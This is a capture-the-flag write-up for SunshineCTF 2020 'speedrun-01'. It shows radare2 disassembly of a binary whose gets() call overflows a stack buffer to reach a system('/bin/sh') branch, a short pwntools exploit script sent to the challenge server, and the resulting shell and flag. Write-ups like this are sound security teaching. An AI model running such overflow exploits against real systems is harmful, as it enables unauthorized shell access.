# speedrun-01

## Task

nc chal.2020.sunshinectf.org 30001

File: chall_01

Tags: binary exploitation

## Solution

This is basically the same as `speedrun-00`, except that we now have a stack of size `0x60` and a call to `fgets` before `gets` is called.

```nasm
[0x00000650]> pdf@main
            ; DATA XREF from entry0 @ 0x66d
┌ 106: int main (int argc, char **argv, char **envp);
│           ; var char *var_60h @ rbp-0x60
│           ; var char *s @ rbp-0x20
│           ; var uint32_t var_8h @ rbp-0x8
│           ; var uint32_t var_4h @ rbp-0x4
│           0x0000075a      55             push rbp
│           0x0000075b      4889e5         mov rbp, rsp
│           0x0000075e      4883ec60       sub rsp, 0x60
│           0x00000762      488d3def0000.  lea rdi, str.Long_time_ago__you_called_upon_the_tombstones ; 0x858 ; "Long time ago, you called upon the tombstones" ; const char *s
│           0x00000769      e892feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000076e      488b159b0820.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x201010:8]=0 ; FILE *stream
│           0x00000775      488d45e0       lea rax, [s]
│           0x00000779      be13000000     mov esi, 0x13               ; int size
│           0x0000077e      4889c7         mov rdi, rax                ; char *s
│           0x00000781      e89afeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x00000786      488d45a0       lea rax, [var_60h]
│           0x0000078a      4889c7         mov rdi, rax                ; char *s
│           0x0000078d      b800000000     mov eax, 0
│           0x00000792      e899feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00000797      817dfcdecafa.  cmp dword [var_4h], 0xfacade
│       ┌─< 0x0000079e      750c           jne 0x7ac
│       │   0x000007a0      488d3ddf0000.  lea rdi, str.bin_sh         ; 0x886 ; "/bin/sh" ; const char *string
│       │   0x000007a7      e864feffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from main @ 0x79e
│       └─> 0x000007ac      817df8decafa.  cmp dword [var_8h], 0xfacade
│       ┌─< 0x000007b3      750c           jne 0x7c1
│       │   0x000007b5      488d3dca0000.  lea rdi, str.bin_sh         ; 0x886 ; "/bin/sh" ; const char *string
│       │   0x000007bc      e84ffeffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from main @ 0x7b3
│       └─> 0x000007c1      90             nop
│           0x000007c2      c9             leave
└           0x000007c3      c3             ret
```

So our exploit script is just modified on two locations:

```python
from pwn import *

payload  = 'A' * (0x60 - 0x4)
payload += '\xde\xca\xfa'

p = remote('chal.2020.sunshinectf.org', 30001)
#p = process("./chall_01")
p.sendline("lol")
p.sendline(payload)
p.interactive()
```

And we get our shell:

```bash
$ python chall00.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30001: Done
[*] Switching to interactive mode
Long time ago, you called upon the tombstones
$ ls
chall_01
flag.txt
$ cat flag.txt
sun{eternal-rest-6a5ee49d943a053a}
```
